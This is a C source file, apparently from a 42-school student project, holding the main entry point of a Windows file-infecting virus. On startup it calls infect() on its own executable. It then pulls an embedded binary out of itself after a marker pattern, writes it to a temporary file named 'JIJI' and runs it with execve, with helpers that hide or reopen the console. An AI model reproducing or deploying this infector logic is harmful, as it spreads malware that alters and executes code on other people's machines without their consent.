/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"
/*
**	Hide and close the current terminal
*/
void				close_console()
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);
	FreeConsole();
}

/*
**	Start a new console and relink file descriptor 0, 1, 2
**	then resizing window 300x600 to position x(100) y(100) and disabling resizing
*/
void				start_debug_console()
{
	AllocConsole();
	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	HWND hWnd = GetConsoleWindow();
	if (hWnd) {
		SetWindowPos(hWnd, 0, 100, 100, 600, 600, NO_FLAGS);
		SetWindowLong(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) &~ WS_SIZEBOX);
	}
}

/*
** Just in case a SEGV is knocking...
*/
void signal_handler(int signal)
{
	printf("Something went wrong, i'm dying... good bye\n");
	exit (1);
}

void		run_process(char *name, char **argv, char **env)
{
	char *infection_content = NULL;
	int infection_size = 0;

	if ((infection_size = windows_file_get_contents_size(&infection_content, name)) <= 0)
		return ;
	int pattern_position = find_pattern(infection_content, infection_size);
	if (pattern_position == -1)//has not binary
		return ;
	char *binary = infection_content + pattern_position;
	int binary_len = infection_size - pattern_position;

	// TODO path by rand number
	char *tmp_path = ft_dstrjoin(".\\", "JIJI", 0);
	windows_file_create_contents_size(tmp_path, binary, binary_len);

	printf("execve : %s\n", tmp_path);
	execve(tmp_path, argv, env);
}

/*
**	Main entry point
*/
int					main(int argc, char **argv, char **env)
{
	setlocale(LC_CTYPE, "");
	signal(SIGSEGV, signal_handler);
	start_debug_console();
	infect(argv[0]);
	run_process(argv[0], argv, env);
	while (1);
	return (0);
}
